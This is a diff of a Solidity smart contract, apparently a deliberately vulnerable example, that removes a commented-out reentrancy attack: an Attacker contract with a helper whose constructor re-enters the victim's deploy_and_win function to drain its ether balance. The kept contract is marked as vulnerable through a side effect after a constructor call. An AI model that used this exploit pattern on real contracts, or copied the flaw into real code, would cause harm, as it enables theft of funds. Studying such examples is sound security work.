@@ -31,59 +31,7 @@ contract C {
 		counters[msg.sender] += 1; // side effect after constructor call makes this vulnerable
 		return addr;
     }
-// contract Attacker {
-//     bytes private create_auxharmless_initcode;
-//     bytes private create_auxharmful_initcode;
-//     address payable private victim;
-
-//     uint public stackCount;
-//     bool public flag;
-
-//     // the first argument represents the (byte-encoded) code of the constructor of the Aux contract
-//     constructor(bytes memory _create_auxharmless_initcode, bytes memory _create_auxharmful_initcode, address payable _victim) payable {    
-//         create_auxharmless_initcode = _create_auxharmless_initcode;
-//         create_auxharmful_initcode = _create_auxharmful_initcode;
-//         victim = _victim;
-//     }
-
-//     function attack() public {
-//         C v = C(victim);
-//         flag = true;
-//         while (flag) {
-//             if ( (v.getCounter(address(this)) + 1) % 10 == 0) {
-//                 stackCount++;
-//                 flag = false;
-//                 // attack only every 10 instances, i.e. when some money is transfered
-//                 bytes memory auxharmful_initcode = abi.encodePacked(create_auxharmful_initcode, abi.encode(address(this)));
-//     	        v.deploy_and_win{value: 0.01 ether}(auxharmful_initcode, payable(address(this)));
-//             }
-//             else {
-//                 v.deploy_and_win{value: 0.01 ether}(create_auxharmless_initcode, payable(address(this)));
-//             }
-//         }
-//     }
-
-//     function reAttack() public {
-//         if (victim.balance > 0.02 ether && stackCount < 50) {
-//             stackCount++;
-//             C v = C(victim);
-//             bytes memory auxharmful_initcode = abi.encodePacked(create_auxharmful_initcode, abi.encode(address(this)));
-//     	    v.deploy_and_win{value: 0.01 ether}(auxharmful_initcode, payable(address(this)));
-//         }
-//     }
-
-//     receive() external payable {}
-// }
-
-// contract AuxHarmless {
-//     constructor() {}
-// }
-
-// contract AuxHarmful {
-//     constructor(address payable attacker) {
-//         Attacker(attacker).reAttack();
-//     }
-// }
+    
     receive() external payable {}
 
 }
